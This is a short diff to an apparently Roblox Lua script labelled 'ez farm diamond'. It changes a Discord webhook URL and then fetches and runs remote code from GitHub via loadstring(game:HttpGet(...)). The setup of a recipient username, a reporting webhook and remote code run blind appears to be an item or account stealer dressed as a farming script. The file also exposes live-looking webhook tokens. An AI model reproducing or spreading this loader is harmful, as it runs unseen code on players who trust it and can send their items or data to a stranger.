@@ -1,5 +1,5 @@
 _G.Username = "yooo1hi"
 _G.HubName = "ez farm diamond"
-_G.WebhookUrl = "https://discord.com/api/webhooks/1100962331283959909/5C3mzFt5063VOdu19xveBvnbKlN0GXSv3cW4IFi9mXyvVfviH1hrRZuUg7W-lyC8rAmG"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1101878117368332329/JgrC9mQoa70BPLlLwcz-HvT-8OneLcm6f_HaoCibpv_hC-vQvtvJhAppwGk2zKpk5NKL"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
